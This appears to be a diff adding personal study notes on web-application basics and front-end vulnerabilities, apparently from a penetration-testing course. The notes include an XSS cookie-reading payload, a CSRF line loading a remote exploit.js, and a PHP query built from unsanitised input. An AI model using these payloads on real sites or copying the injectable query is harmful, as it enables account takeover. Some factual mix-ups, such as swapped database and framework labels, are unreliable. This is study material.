+*It is also possible to host each component of the back end on its own isolated server or in isolated containers by utilizing services such as Docker. To maintain logical separation and mitigate the impact of vulnerabilities different components of the web application such as the database can be installed in one Docker container while the main web application is installed in another thereby isolating each part from potential vulnerabilities that may affect the other containers. It is also possible to separate each into its dedicated server which can be more resource-intensive and time consuming to maintain. Still it depends on the business case and design/functionality of the web application in question.
+
+*Some of the main jobs performed by back end components include:
+
+		Develop the main logic and services of the back end of the web application
+
+		Develop the main code and functionalities of the web application
+
+		Develop and maintain the back end databases
+
+		Develop and implement libraries to be used by the web application
+
+		Implement technical/ business needs for the web application
+
+		Implement the main APIs for front end component communications
+
+		Integrate remote servers and cloud services into the web application
+
+------------------------
+
+
+Securing Front/Back End:
+
+*Even though in most cases we will not have access to the back end code to analyze the individual functions and the structure of the code it does not make the application invulnerable. It could still be exploited by various injection attacks.
+
+*Suppose we have a search function in a web application that mistakenly does not process our search queries correctly. In that case we could use specific techniques to manipulate the queries in such a way that we gain unauthorized access to specific database data SQL injections or even execute operating system commands via the web application also known as command injections.
+
+*We will later discuss how to secure each component used on the front and back ends. When we have full access to the source code of front end components we can perform a code review to find vulnerabilities which is part of what is referred to as Whitebox pentesting.
+
+*On the other hand back end components source code is stored on the back end server so we do not have access to it by default which forces us only to perform what is known as Blackbox pen testing. However as we will see some web applications are open source meaning we likely have access to their source code. Furthermore some vulnerabilities such as local file inclusion could allow us to obtain the source code from the back end server. With this source code in hand we can then perform a code review on back end components to further understand how the application works, potentially find sensitive data in the source code such as passwords, and even find vulnerabilities that would be difficult or impossible to find without access to the source code.
+
+*It is important to begin to familiarize ourselves with these flaws and vulnerabilities as they form the basis for many of the issues we cover in future web and even non web related modules. As pen testers we must have the ability to competently identify, exploit, and explain these vulnerabilities for our clients.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+HTML:
+
+*The first and most dominant component of the front end of web applications is HTML (Hypertext Markup Language). HTML is at the very core of any web page we see on the internet. It contains each pages basic elements, including titles, forms, images, and many other elements. The web browser in turn interprets these elements and displays them to the end user. 
+
+*The following is a very basic example of an HTML page:
+
+		<!DOCTYPE html>
+		<html>
+		    <head>
+		        <title>Page Title</title>
+		    </head>
+		    <body>
+		        <h1>A Heading</h1>
+		        <p>A Paragraph</p>
+		    </body>
+		</html>
+
+*This would display the following: 
+
+		A Heading
+		
+		A paragraph
+
+--------------------
+
+HTML Structure:
+
+		document
+		 - html
+		   -- head
+		      --- title
+		   -- body
+		      --- h1
+		      --- p
+
+*Each element can contain other HTML elements while the main HTML tag should contain all other elements within the page which falls under document, distinguishing between HTML and documents written for other languages, such as XML documents.
+
+*Each HTML element is opened and closed with a tag that specifies the elements type e.g. <p> for paragraphs where the content would be placed between these tags. Tags may also hold the elements id or class e.g. <p id='para1'> or <p id='red-paragraphs'> which is needed for CSS to properly format the element. Both tags and the content comprise the entire element.
+
+---------------------
+
+
+URL Encoding:
+
+*An important concept to learn in HTML is URL Encoding or percent encoding. For a browser to properly display a pages contents it has to know the charset in use. In URLs for example browsers can only use ASCII encoding which only allows alphanumerical characters and certain special characters. Therefore all other characters outside of the ASCII character set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a "%" symbol followed by two hexadecimal digits.
+
+*For example the single quoted character " ' " is encoded to "%27" which can be understood by browsers as a single quote. URLs cannot have spaces in them and will replace a space with either a "+" or "%20".
+
+*Many online tools can be used to perform URL encoding/decoding. Furthermore the popular web proxy Burp Suite has a decoder/encoder which can be used to convert between various types of encoding. 
+
+----------------------
+
+
+Usage:
+
+*The <head> element usually contains elements that are not directly printed on the page like the page title while all main page elements are located under <body>. Other important elements include the <style> which holds the pages CSS code and the <script> which holds the JS code of the page as we will see in the next section.
+
+*Each of these elements is called a DOM (Document Object Model). The World Wide Web Consortium (W3C) defines DOM as:
+
+		"The W3C Document Object Model (DOM) is a platform and language neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."
+
+*The DOM standard is separated into 3 parts:
+
+		1. Core DOM	The standard model for all document types
+		
+		2. XML DOM	The standard model for XML documents
+		
+		3. HTML DOM	The standard model for HTML documents
+
+*For example from the above tree view we can refer to DOMs as document.head or document.h1 as so on.
+
+*Understanding the HTML DOM structure can help us understand where each element we view on the page is located which enables us to view the source code of a specific element on the page and look for potential issues. We can locate HTML elements by their id, their tag name, or by their class name.
+
+*This is also useful when we want to utilize front-end vulnerabilities like XSS to manipulate existing or elements or create new elements to serve our needs.
+
+-------------------
+
+
+Exercise:
+
+What is the HTML tag used to show an image?
+
+1. The html tag used to display and image is "<img>".
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Cascading Style Sheets (CSS):
+
+*CSS is the stylesheet language used alongside HTML to format and set of HTML elements. Like HTML there are several versions of CSS and each subsequent version introduces a new set of capabilities that can be used for formatting HTLP elements. Browsers are updated alongside it to support these new features.
+
+-----------------
+
+
+Example:
+
+*At a fundamental level CSS used to define the style of each class or type of HTML elements i.e. body or h1 such that any element within that page would be represented as defined in the CSS file. This could include the font family, font size, background color, text color and alignment and more.
+
+		body {
+		  background-color: black;
+		}
+
+		h1 {
+		  color: white;
+		  text-align: center;
+		}
+
+		p {
+		  font-family: helvetica;
+		  font-size: 10px;
+		}
+
+*As previously mentioned this is why we may set unique IDs or class names for certain HTML elements so that we can later refer to them within CSS or JavaScript when needed.
+
+-------------------
+
+
+Syntax:
+
+*CSS defines the style of each HTML element or class between curly brackets "{}" within the properties are defined with their values i.e. "element { property : value; }".
+
+*Each HTML element has many properties that can be set through CSS such as height, position, boarder, margin, padding, color, text align, font size, and hundreds of other properties. All of these can be combined and used to design visually appealing web pages.
+
+*CSS can be used for advanced animations for a wide variety of uses from moving items all the way to advanced 3D animations. Many CSS properties are available for animations like @keyframes, animation-duration, animation-direction, and many others. 
+
+-----------------------
+
+
+Usage:
+
+*CSS is often used alongside JavaScript to make quick calculations, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystrokes or the mouse cursor. location.
+
+-----------------------
+
+
+Frameworks:
+
+*Many may consider CSS to be difficult to develop. In contrast others may argue that it is inefficient to manually set the style and design of all HTML elements in each web page. This is why many CSS frameworks have been introduced which contain a collection of CSS style sheets and designs to make it much faster and easier to create beautiful HTML elements.
+
+*Furthermore these frameworks are optimized for web application usage. They are designed to be used with JavaScript and for wide use within a web application and contain elements usually required within modern applications. Some of the most common CSS frameworks are:
+
+		Bootstrap
+
+		SASS
+
+		Foundation
+
+		Bulma
+
+		Pure
+
+-----------------------
+
+Exercise:
+
+What is the CSS "property: value" used to make an HTML element's text aligned to the left?
+
+1. text-align: left;
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+JavaScript:
+
+*JavaScript is one of the most used languages in the world. It is mostly used for web development and mobile development. JavaScript is usually used on the front end of an application to be executed within a browser. Still there are implementations of back end JavaScript used to develop entire web applications like NodeJS.
+
+*While HTML and CSS are mainly in charge of how a web page looks JavaScript is usually used to control any functionality that the front end web page requires. Without JavaScript a web page would be mostly static and would not have much functionality or interactive elements.
+
+--------------------
+
+
+Example:
+
+*Within the page source code JavaScript code is loaded with the "<script>" tag as follows:
+
+		<script type="text/javascript">
+		..JavaScript code..
+		</script>
+
+*A web page can also load remote JavaScript code with src and the scripts link as follows:
+
+		<script src="./script.js"></script>
+
+*An example of basic use of JavaScript within a web page is the following:
+
+		document.getElementById("button1").innerHTML = "Changed Text!";
+
+*As with HTML there are many sites available online to experiment with JavaScript. Once example is JSFiddle which can be used to test JavaScript, CSS, and HTML and save code snippets. JavaScript is an advanced language and its syntax is not as simple as HTML or CSS.
+
+-----------------------
+
+
+Usage:
+
+*Most common web application heavily rely on JavaScript to drive all needed functionality on the web page like updating the web page view in real time, dynamically updating content in real time, accepting and processing user input, and many other potential functionalities.
+
+*JavaScript is also used to automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data through technologies like Ajax.
+
+*In addition to automation JavaScript is also often used alongside CSS as previously mentioned to drive advanced animations that would not be possible with CSS alone. Whenever we visit an interactive and dynamic web page that uses many advanced and visually appealing animations we are seeing the result of active JavaScript code running on our browser.
+
+*All modern web browsers are equipped with JavaScript engines that can execute JavaScript code on the client side without relying on the back end webserver to update the page. This makes using JavaScript a very fast way to achieve a large number of processes quickly.
+
+------------------------
+
+
+Frameworks:
+
+*As web applications become more advanced it may be inefficient to use pure JavaScript to develop an entire web application from scratch. This is why a host of JavaScript frameworks have been introduced to improve the experience of web application development.
+
+*These platforms introduce libraries that make it very simple to re-create advanced functionalities like user login and user registration and they introduce new technologies based on existing ones like the use of dynamically changing HTML code instead of using static HTML code.
+
+*These platforms either use JavaScript as their programming language or use an implementation of JavaScript that compiles its code into JavaScript code.
+
+*Some of the most common front end JavaScript frameworks are:
+
+		Angular
+
+		React
+
+		Vue
+
+		jQuery
+
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+Front End Vulnerabilities:
+
+
+Sensitive Data Exposure:
+
+*All of the front end components we covered are interacted with on the client side. Therefore if they are attacked they do not pose a direct threat to the core back end of the web application and usually will not lead to permanent damage. However as these components are executed on the client side they put the end user in danger of being attacked and exploited if they do have any vulnerabilities. If a front end vulnerability is leveraged to attack admin users it could result in unauthorized access, access to sensitive data, service disruption, and more.
+
+*Although majority of web application penetration testing is focused on back end components and their functionality it is important to also test front end components for potential vulnerabilities as these types of vulnerabilities can sometimes be utilized to gain access to sensitive functionality (i.e. an admin panel) which may lead to compromising the entire server.
+
+*Sensitive data exposure refers to the availability of sensitive data in clear text to the end user. This is usually found in the source code of the web page or page source on the front end of web applications. This is the HTML source code of the application not to be confused with the back end code that is typically only accessible on the server itself. We can view any websites page source in our browser by right clicking anywhere on the page and selecting view page source from the popup menu. Sometimes a developer may disable right clicking on a web application but this does not prevent us from viewing the page source as we can merely type "ctrl + u" or view the page source through a web proxy such as Burp Suite. 
+
+*Sometimes we may find login credentials, hashes, or other sensitive data hidden in the comments of a web pages source code or with external JavaScript code being imported. Other sensitive information may include exposed links or directories or even exposed user information all of which can potentially  be leveraged to further our access within the web application or even the web ap-plications supporting infrastructure like webserver, database server, etc.
+
+--------------------------------
+
+
+Prevention:
+
+*Ideally the front end source code should only contain the code necessary to run all of the web applications functions without any extra code or comments that are not necessary for the web application to function properly. It is always important to review the code that will be visible to end users through the page source or run it through tools to check for exposed information. 
+
+*It is also important to classify data types within the source code and apply controls on what can or cannot be exposed on the client side. Developers should also review client side code to ensure that no unnecessary comments or hidden links are left behind. Furthermore front end developers may want to use JavaScript code packing or obfuscation to reduce the chances of exposing sensitive data through JavaScript code. These techniques may prevent automated tools from locating these types of data. 
+
+---------------------------
+
+
+Exercise:
+
+Check the above login form for exposed passwords. Submit the password as the answer.
+
+1. The first thing I do is copy and paste the IP address into my browser
+
+2. Then I hit "ctrl + u" to bring up the pages source code.
+
+3. Now I look for the any user credentials saved in the source code.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+HTML Injection:
+
+*Another major aspect of front end security is validating and sanitizing accepted user input. In many cases user input validation and sanitization is carried out on the back end. However some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore it is critical to validate and sanitize user input on both the front end and the back end.
+
+*HTML Injection occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code like retrieving a user comment from the back end databases or by directly displaying unfiltered user input through JavaScript on the front end.
+
+*When a user has complete control of how their input will be displayed they can submit HTML code and the browser may display it as part of the page. This may include a malicious HTML code like an external login form which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.
+
+*Another example of HTML injection is web page defacing. This consists of injecting new HTML code to change the web pages appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.
+
+------------------------------
+
+
+Example:
+
+*The following example is a very basic web page with a single button "click to enter your name". When we click on the button it prompts us to input our name and then displays our name.
+
+*If no input sanitation is in place this is potentially an easy target for HTML injection and Cross Site Scripting attacks. We take a look at the page source code and see no input sanitization in place whatsoever as the page takes user input and directly displays it.
+
+*To test for HTML injection we can simply input a small snipper of HTML code as our name and see if it is displayed as part of the page. We will test the following code which changes the background image of the web page:
+
+		<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
+
+*Once we input it we see that the web pages background image changes instantly.
+
+---------------------------------
+
+
+Exercise:
+
+What text would be displayed on the page if we use the following payload as our input: <a href="http://www.hackthebox.com">Click Me</a>
+
+1. The first thing I do is copy and paste the IP address into my web browser.
+
+2. Then the website prompts me to click a button to enter my name.
+
+3. when prompted for my name i copy and past the above code inside of it.
+
+4. When submitted it gives me and output "Your name is Click Me" with the "Click Me" part being a link to the hack the box website.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Cross Site Scripting:
+
+*HTML injection vulnerabilities can often be utilized to also perform cross site scripting attacks by injecting JavaScript code to be executed on the client side. Once we can execute code on the victims machine we can potentially gain access to the victims account or even their machine. CSS is very similar to HTML injection in practice. However XSS involves the injection of JavaScript code to perform more advanced attacks on the client side instead of merely injection HTML code. There are three main types of XSS:
+
+		1. Reflected XSS		Occurs when user input is displayed on the page after processing e.g. search result or error message.
+
+		2. Stored XSS			Occurs when user input is stored in the back end database and then displayed upon retrieval e.g. posts or comments.
+
+		3. DOM XSS			Occurs when user input is directly shown in the browser and is written to an HTML DOM object e.g. vulnerable user name or page title.
+
+*In the example we saw for HTML injection there was no input sanitization whatsoever. Therefore it may be possible for the same page to be vulnerable to XSS attacks. We can try to inject the following DOM XSS JavaScript code as a payload which should show us the cookie value for the current user:
+
+		#"><img src=/ onerror=alert(document.cookie)>
+
+*Once we input our payload and hit ok we see that an alert window pops up with the cookie value in it.
+
+*This payload is accessing the HTML document tree and retrieving the cookie objects value. When the browser processes our input it will be considered a new DOM and our JavaScript will be executed displaying the cookie value back to us in a popup.
+
+*An attacker can leverage this to steal cookie sessions and send them to themselves and attempt to use the cookie value to authenticate to the victims account. The same attack can be used to perform various types of other attacks against a web applications users. 
+
+-----------------------------
+
+
+Exercise:
+
+Try to use XSS to get the cookie value in the above page
+
+1. First I copy and paste the IP address into my browsers URL.
+
+2. Then when I am prompted to enter my name I will use this code instead: #"><img src=/ onerror=alert(document.cookie)>
+
+3. After inputting this code the website gives me the cookie value.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Cross Site Request Forgery (CSRF):
+
+*The third type of front end vulnerability that is caused by unfiltered user input is cross site request forgery. CSRF attacks may utilize XSS vulnerabilities to perform certain queries and API calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions like utilizing HTTP parameters for attacks.
+
+*A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victims password to the value set by the attacker. Once the victim viewed the payload on the vulnerable page e.g. a malicious comment containing the JavaScript CSRF payload, the JavaScript code would execute automatically. It would use the victims logged in session to change their password. Once that is done the attacker can log in to the victims account and control it.
+
+*CSED can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions which can sometimes be used to attack and gain control over the back end server depending on the functionality provided to admins within a given web application. Following this example instead of using JavaScript code that would return the session cookie we would load a remote .js file as follows:
+
+		"><script src=//www.example.com/exploit.js></script>
+
+*The exploit.js file would contain the malicious JavaScript code that changes the users password. Developing the exploit.js in this case requires knowledge of this web applications password changing procedure and APIs. The attacker would need to create JavaScript code that would replicate the desired functionality and automatically carry it out i.e. JavaScript code that changes our password for this specific web application.
+
+-------------------------
+
+
+Prevention:
+
+*Though there should be measures on the back end to detect and filter user input it is also always important to filter and sanitize user input on the front end before it reaches the back end and especially if this code may be displayed directly on the client side without communicating with the back end. Two main controls must be applied when accepting user input:
+
+		1. Sanitization		Removing special characters and non standard characters from user input before displaying it or storing it.
+
+		2. Validation		Ensuring that submitted user input matches the expected format i.e. submitted email matched email format.
+
+*Furthermore it is also important to sanitize displayed output and clear any special/non standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters it will still not cause any harm on the front end.
+
+*Once we sanitize and or validate user input and displayed output we should be able to prevent attacks like HTML injection, XSS, or CSRF. Another solution would be to implement a web application firewall (WAF) which should help to prevent injection attempts automatically. However it should be noted that WAF solutions can potentially be bypassed so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.
+
+*As for CSRF many modern browser have bult in anti CSRF measures which prevent automatically executing JavaScript code. Furthermore many modern web applications have anti CSRF measures including certain HTTP headers and flags that can prevent automated requests i.e. anti CSRF token or HTTLP-only/X-XSS-Protection. Certain other measures can be taken from a functional level like requiring the user to input their password before changing it. Many of these security measures can be bypassed and therefore these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure and developers should always ensure that their code is not vulnerable to any of these attacks. 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+Back End Servers:
+
+*A back end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fir in the data access layer.
+
+-------------------
+
+
+Software:
+
+*The bac end server contains the other 3 back end components:
+
+		Web Server			Apache, NGINX, IIS
+
+		Database			PHP, C#, JAVA
+	
+		Development Framework		MySQL, MS SQL, Oracle
+
+*Other software components on the back end server may include hypervisors, containers, and WAFs.
+
+*There are many popular combinations of stacks for back end servers which contain a specific set of back end components. Som common examples include:
+
+		LAMP		Linux, Apache, MySQL, and PHP
+	
+		WAMP		Windows, Apache, MySQL, and PHP
+
+		WINS		Windows, IIS, .NET, and SQL Server
+
+		MAMP		macOS, Apache, MySQL, and PHP
+
+		XAMPP		Cross platform, Apache, MySQL, and PHP/PERL
+
+--------------------------------
+
+
+Hardware:
+
+*The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be. As previously discussed in the architecture section many architectures especially for huge when applications are designed to distribute their load over many back end servers that collectively work together to perform the same tasks and deliver the web application to the end user. Web applications do not have to run directly on a single back end server but may utilize data center and cloud hosting services that provide virtual hosts for the web application.
+
+--------------------------------
+
+
+Web Servers:
+
+*A web server is an application that runs on the back end server which handles all of the HTTP traffic from the client side browser, routes it to the requested page, and finally responds to the client side browser. Web servers usually run on TCP ports 80 or 443 and are responsible for connecting end users to various parts of the web application in addition to handling their various responses.
+
+--------------------------------
+
+
+Workflow:
+
+*A typical web server accepts HTTP requests from the client side and responds with different HTTP responses and codes like a code 200 OK response for successful request, a code 404 NOT FOUND when requesting pages that do not exist, code 403 FORBIDDEN for requesting access to restricted pages, and so on.
+
+*Web servers also accept various types of user input within HTTP requests including text, JSON, and even binary data i.e. for file uploads. Once a web server receives a web request it is then responsible for routing it to its destination, run any processes needed for that request, and return to the user on the client side. The pages and files that the webserver processes and routes traffic to are the web application core files. 
+
+*The following shows an example of requesting a page in a Linux terminal using cURL utility and receiving the server while using the "-I" flag which displays the header:
+
+		Romeltier1@htb[/htb]$ curl -I https://academy.hackthebox.com
+
+		HTTP/2 200
+		date: Tue, 15 Dec 2020 19:54:29 GMT
+		content-type: text/html; charset=UTF-8
+		...SNIP...
+
+*While the cURL command example shows us the source code of the webpage:
+
+		Romeltier1@htb[/htb]$ curl https://academy.hackthebox.com
+
+		<!doctype html>
+		<html lang="en">
+		<head>
+		<meta charset="utf-8" />
+		<title>Cyber Security Training : HTB Academy</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+*Many web server types can be utilized to run web applications. Most of these can handle all types of complex HTTP requests and they are usually free of charge. We can even develop our own basic web server using languages such as Python, JavaScript, and PHP. However for each language there's a popular web application that is optimized for handling large amounts of web traffic which saves us time in creating our own web server.
+
+*Apache or httpd is the most common web server on the internet hosting more than 40% of all internet website. Apache usually comes preinstalled in most Linux distributions and can also be installed on Windows and macOS servers. 
+
+*Apache is usually used with PHP for web application development but it also supports other languages like .NET, Python, PERL, and even OS languages like Bash through CGI. Users can install a wide variety of Apache modules to extend its functionality and support more languages. For example to support serving PHP files users must install PHP on the back end server in addition to installing the mod_php module for Apache.
+
+*Apache is an open source project and community users can access its source code to fix issues and look for vulnerabilities. It is well maintained and regularly patched against vulnerabilities to keep it safe against exploitation. Furthermore it is very well documented making using and configuring different parts of the webserver relatively easy. Apache is commonly used by startups and smaller companies as it is straightforward to develop for. Still big companies utilize Apache including Apple, Adobe, and Baidu.
+
+----------------------------
+
+
+NGINX:
+
+*NGINX is the second most common web server on the internet hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes NGINX a very reliable web server for popular web application and top businesses worldwide which is why it is the most popular web server among high traffic websites with around 60% of the top 100,000 websites using NGINX. 
+
+*NGINX is also free and open source which gives all the same benefits previously mentioned like security and reliability. Some popular websites include Google, Facebook, Twitter, Cisco, Intel, Netflix, and HackTheBox.
+
+-------------------------------
+
+
+IIS (Internal Information Services):
+
+*IIS is the third most common web server on the internet hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. IIS is usually used to host web applications developed for Microsoft .NET framework but can also be used to host web applications developed in other languages like PHP or host other types of services like FTP. Furthermore IIS is very well optimized for Active Directory integration and includes features like Windows Auth for authenticating users using Active Directory allowing them to automatically sign in to web applications. 
+
+*Though not the most popular web server many big organizations use IIS as their web server. Many of them use Windows server on their back end or rely heavily on Active Directory within their organization. Some popular websites that utilize IIS include Microsoft, Office365, Skype, Stack Overflow, and Dell.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Databases:
+
+*Web applications utilize back end databases to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. This allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.
+
+*There are many different types of databases each of which fits a certain type of use. Most developers look for certain characteristics in a database such as speed in storing and retrieving data, size when storing large amounts of data, scalability as the web application grows, and cost.
+
+--------------------------
+
+
+Relational (SQL):
+
+*Relational (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys which can link tables together and create relationships between tables.
+
+*For example we can have a users table in a relational database containing columns like id, username, first_name, last_name, and so on. The id can be used as the table key. Another table posts may contain posts made by all users with columns like id, user_id, date, content, and so on.
+
+*We can link the id from the user table to the user_id in the posts table to easily retrieve the user details for each post without having to store all user details with each post. 
+
+*A table can have more than one key as another column can be used as a key to link with another table. For example the id column can be used as a key to link the posts table to another table containing comments each of which belongs to a certain post and so on.
+
+*This way by using relational databases it becomes very quick and easy to retrieve all data about a certain element from all databases. For example we can retrieve all details linked to a certain user from all tables with a single query. This makes relational databases very fast and reliable for big datasets that have a clear structure and design. Databases also make data management very efficient. 
+
+---------------------------
+
+
+Non Relational (NoSQL):
+
+*A non relational database does not use tables, rows, columns, primary keys, or schemas. Instead a NoSQL database stores data using various storage models depending on the type of data stored.
+
+*Due to lack of a defined structure for the database NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured a NoSQL database would be the best choice for storing our data.
+
+*There are 4 common storage models for NoSQL databases:
+
+		Key-Value
+
+		Document-Based
+
+		Wide-Column
+
+		Graph
+
+*Each of the above models has a different way of storing data. 
+
+----------------------------
+
+
+Use in Web Applications:
+
+*Most modern web development languages and frameworks make it easy to integrate, store, and retrieve data from various database types. But first the database has to be installed and set up on the back end server and once it is up and running the web applications can start utilizing it to store and retrieve data.
+
+*For example within a PHP web application once MySQL is up and running we can connect to the database server with:
+
+		$conn = new mysqli("localhost", "user", "pass");
+
+*Then we can create a new database with:
+
+		$sql = "CREATE DATABASE database1";
+		$conn->query($sql)
+
+*After that we can connect to our new database and start using the MySQL database through MySQL syntax right within the PHP as follows:
+
+		$conn = new mysqli("localhost", "user", "pass", "database1");
+		$query = "select * from table_1";
+		$result = $conn->query($query);
+
+*Web applications usually use user input when retrieveing data. For example when a user uses the search function to search for other users their search input is passed to the web application which uses the input to search within the databases.
+
+		$searchInput =  $_POST['findUser'];
+		$query = "select * from users where name like '%$searchInput%'";
+		$result = $conn->query($query);
+
+*Finally the web application sends the result back to the user:
+
+		while($row = $result->fetch_assoc() ){
+			echo $row["name"]."<br>";
+		}
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Development Frameworks & APIs:
+
+*In addition to web servers that can host web applications in various languages there are many common web development frameworks that help in developing core web application files and functionality. With th increased complexity of web applications it may be challenging to create a modern and sophisticated web application from scratch. Hence most of the popular web applications are developed using web frameworks.
+
+*As most web applications share common functionality such as user registration web development frameworks make it easy to quickly implement this functionality and link them to the front end components making a fully functional web application. Some of the most common web development frameworks include:
+
+		Laravel (PHP		Usually used by startups and smaller companies as it is powerful yet easy to develop for.
+
+		Express (Node JS)	Used by PayPal, Yahoo, Uber, and IBM, and Myspace
+
+		Django (Python)		Used by Google, YouTube, Instagram, Mozilla, and Pinterest
+
+		Rails (Ruby)		Used by GitHub, Hulu, Twitch, Airbnb, and even Twitter in the past
+
+-------------------------------
+
+
+APIs:
+
+*An important aspect of back end web application development is the use of web APIs and HTTP request parameters to connect the from end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.
+
+*For the front end component to interact with the back end and ask for certain tasks to be carried out they utilize APIs to ask the back end component for a specific task with specific input. The back end components process these requests, perform the necessary functions, and return a certain response to the front end components which finally renderers the end users output on the client side.
+
+------------------------
+
+
+Query Parameters:
+
+*The default method of sending specific arguments to a web page is through GET and POST request parameters. This allows the front end components to specify values for certain parameters used within the page for the back end components to process them and respond accordingly.
+
+*For example a /search.php page would take an item parameter which may be used to specify the search item. Passing a parameter through a GET request is done through the URL /search.php?item=apples while POST parameters are passed through data at the bottom of the POST HTTP request:
+
+		POST /search.php HTTP/1.1
+		...SNIP...
+
+		item=apples
+
+*Query parameters allow a single page to receive various types of input each of which can be processed differently. For certain other scenarios web APIs may be much quicker and more efficient to use. 
+
+-----------------------
+
+
+Web APIs:
+
+An API (Application Programming Interface) is an interface within an application that specifies how the application can interact with other applications. For web application it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the HTTP protocol and are usually handled and translated through web servers.
+
+*A weather web application for example may have certain API to retrieve the current weather for a certain city. We can request the API URL and pass the city name or city id and it would return the current weather in a JSON object. Another example is Twitters API which allows us to retrieve the latest tweets from a certain account in XML or JSON formats and even allows us to send a tweet if authenticated and so on.
+
+------------------------------
+
+
+SOAP:
+
+The SOAP (Simple Object Access) standard shares the data through XML where the request is made in XML through an HTTP request and the response is also returned in XML. Front end components are designed to parse this XML output properly. The following is an example SOAP message:
+
+		<?xml version="1.0"?>
+
+		<soap:Envelope
+		xmlns:soap="http://www.example.com/soap/soap/"
+		soap:encodingStyle="http://www.w3.org/soap/soap-encoding">
+
+		<soap:Header>
+		</soap:Header>
+
+		<soap:Body>
+		  <soap:Fault>
+		  </soap:Fault>
+		</soap:Body>
+
+		</soap:Envelope>
+
+*SOAP is very useful for transferring structured data i.e. an entire class object or even binary data and is often used with serialized objects all of which enables sharing complex data between front end and back end components and parsing it properly. It is also very useful for sharing stateful objects i.e. sharing/changing the current state of a web page, which is becoming more common with modern web applications and mobile applications.
+
+*However SOAP may be difficult to use for beginners or require long and complicated requests even for smaller queries like basic search or filter queries. This is where the REST API standard is more useful.
+
+------------------------
+
+
+REST (Representational State Transfer):
+
+*The REST standard shares data through the URL path i.e. search/users/1 and usually returns the output in JSON format i.e. userid 1.
+
+*Unlike Query parameters REST APIs usually focus on pages that expect one type of input passed directly through the URL path without specifying its name or type. This is usually useful for queries like search, sort, or filter. This is why REST APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions making the web application more modular and scalable.
+
+*Responses to REST API requests are usually made in JSON format and the front end components are then developed to handle this response and render it properly. Other output formats for REST include XML, x-www0form-urlencoded, or even raw data. As previously seen in the database section the following is an example of a JSON response to the GET/category/posts/ API request:
+
+		{
+		  "100001": {
+		    "date": "01-01-2021",
+		    "content": "Welcome to this web application."
+		  },
+		  "100002": {
+		    "date": "02-01-2021",
+		    "content": "This is the first post on this web app."
+		  },
+		  "100003": {
+		    "date": "02-01-2021",
+		    "content": "Reminder: Tomorrow is the ..."
+		  }
+		}
+
+*REST uses various HTTP methods to perform different actions on the web application:
+
+		GET 		request to retrieve data
+
+		POST		request to create data (non-idempotent)
+
+		PUT		request to create or replace existing data (idempotent)
+
+		DELETE		request to remove data
+
+------------------------
+
+
+Exercise:
+
+Use GET request '/index.php?id=0' to search for the name of the user with id number 1?
+
+1. I will copy and past the IP address into my browsers URL
+
+2. Now I will copy and paste the "/index.php?id=1" GET request after the IP address to view the user ID with number 1.
+
+3. When I search for it I get a page with the User ID: Superadmin
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+Common Web Vulnerabilities:
+
+*If we were performing a penetration test on an internally developed web application or did not find any public exploits for a public web application we may manually identify several vulnerabilities. We may also uncover vulnerabilities caused by misconfigurations even in publicly available web applications since these types of vulnerabilities are not caused by the public version of the web application but by a misconfiguration made by developers. The below examples are some of the most common vulnerability types for web applications part of OWASP Top 10 vulnerabilities for web applications.
+
+------------------
+
+
+Broken Authentication/Access Control:
+
+*Broken authentication and broken access control are among the most common and most dangerous vulnerabilities for web applications.
+
+*Broken authentication refers to vulnerabilities that allow attackers to bypass authentication functions. For example this may allow an attacker to login without having a valid set of credentials or allow a normal user to become an administrator without having the privileges to do so.
+
+*Broek access control refers to vulnerabilities that allow attackers to access pages and features they should not have access to. For example a normal user gaining access to the admin panel.
+
+-----------------------------
+
+
+Malicious File Upload:
+
